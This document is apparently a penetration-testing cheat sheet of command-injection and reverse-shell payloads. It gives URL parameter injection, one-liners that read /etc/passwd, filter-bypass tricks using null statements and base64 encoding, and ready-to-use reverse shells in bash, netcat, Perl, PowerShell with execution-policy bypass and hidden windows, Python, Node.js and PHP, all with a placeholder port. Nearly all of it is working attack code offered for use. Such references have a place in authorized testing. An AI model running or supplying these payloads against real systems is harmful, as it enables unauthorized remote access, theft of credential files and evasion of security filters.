	Note:
		URL encode commands when submitting
		/tmp, /var/tmp and /var/lock are typically world writeable
	In below, replace [PORT]

# Shells
## In URL
Sometimes additional commands can be appended to variables parsed server-side.
`?variable=legitvalue;ls+-l`
## Python
Python3
`python3 -c "print(open('/etc/passwd', 'r').read())"`
Python2
`python2 -c "print(open('/etc/passwd',+'r').read())"`
## Filter Bypasses
Using null statements to bypass string detection
`whoa$()mi, l$()s -$()l`

Base64 encoding
`echo "$(openssl enc -base64 -d <<< "Y2F0IC9ldGMvcGFzc3dkCg==")"`

# Reverse Shells

## Localhost
Initialise a netcat listener
`nc -nlvp PORT`
## Bash
`bash -c 'bash -i >& /dev/tcp/127.0.0.1/[PORT] 0>&1'`
`sh -i >& /dev/tcp/127.0.0.1/[PORT] 0>&1`
## Netcat
`/bin/nc -nv 127.0.0.1 [PORT] -e /bin/bash`
## Perl
`perl -e 'use Socket;$i="127.0.0.1";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

## Powershell
Opening sockets using -Exec Bypass
`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("127.0.0.1",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`

Opening Sockets using $client
`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
## Python2
`python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
## JavaScript 
Uses JavaScript to spawn a netcat connection
`echo "require('child_process').exec('nc -nv 127.0.0.1 [PORT] -e /bin/bash')" > /var/tmp/shell.js ; node /var/tmp/shell.js`
## PHP
Various ways of using PHP to spawn connection
```
php -r '$sock=fsockopen("127.0.0.1",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("127.0.0.1",[PORT]);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("127.0.0.1",[PORT]);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("127.0.0.1",[PORT]);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("127.0.0.1",[PORT]);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
php -r "system(\"bash -c 'bash -i >& /dev/tcp/127.0.0.1/[PORT] 0>&1'\");"
```
